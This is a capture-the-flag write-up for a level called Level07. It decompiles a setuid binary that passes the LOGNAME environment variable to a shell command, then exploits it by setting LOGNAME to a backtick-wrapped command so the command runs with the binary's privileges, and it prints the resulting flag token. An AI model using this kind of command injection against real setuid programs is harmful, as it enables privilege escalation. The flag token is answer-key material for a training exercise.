# Level07

## Solution

We have an executable file.

```
$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

We can see that this executable contains more interesting functions that grant permissions, but also ``getenv``.

```
$ strings level07
...
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
...
```

Thanks to this site, we can get an idea of the code contained in the executable file.
</br>
<<https://dogbolt.org/>>

```
$ scp -P 4242 level07@0.0.0.0:/home/user/level07/level07 .
```

```
v1 = getegid();
v2 = geteuid();
setresgid(v1, v1, v1);
setresuid(v2, v2, v2);
v0 = 0;
getenv("LOGNAME");
asprintf(&v0, "/bin/echo %s ");
```

We understand that the executable echoes the LOGNAME environment variable.

```
$ export LOGNAME=\`getflag\`
```

We use the export command to change the value of LOGNAME.

```
$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
